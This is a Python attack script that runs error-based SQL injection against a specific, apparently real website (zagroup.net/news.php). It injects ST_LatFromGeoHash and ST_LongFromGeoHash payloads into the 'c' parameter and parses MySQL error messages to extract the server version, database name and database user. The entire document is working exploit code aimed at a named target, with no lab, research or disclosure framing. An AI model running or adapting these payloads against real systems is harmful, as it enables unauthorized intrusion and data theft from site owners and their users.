#!/usr/bin/env python3
"""zagroup: ST_LatFromGeoHash error-based extraction"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def extract(payload, tag):
    u = BASE + "?c=259" + payload
    code, body = fetch(u)
    # error message contains the data
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    print("%-20s code=%s %s" % (tag, code, m.group(1)[:200] if m else "size=%d" % len(body)))
    return m.group(1) if m else ""

print("=== ST_LatFromGeoHash extraction ===")
extract("%27%20and%20ST_LatFromGeoHash(concat(0x7e,version()))--%20", "version")
extract("%27%20and%20ST_LatFromGeoHash(concat(0x7e,database()))--%20", "database")
extract("%27%20and%20ST_LatFromGeoHash(concat(0x7e,user()))--%20", "user")
extract("%27%20and%20ST_LongFromGeoHash(concat(0x7e,version()))--%20", "version-L")
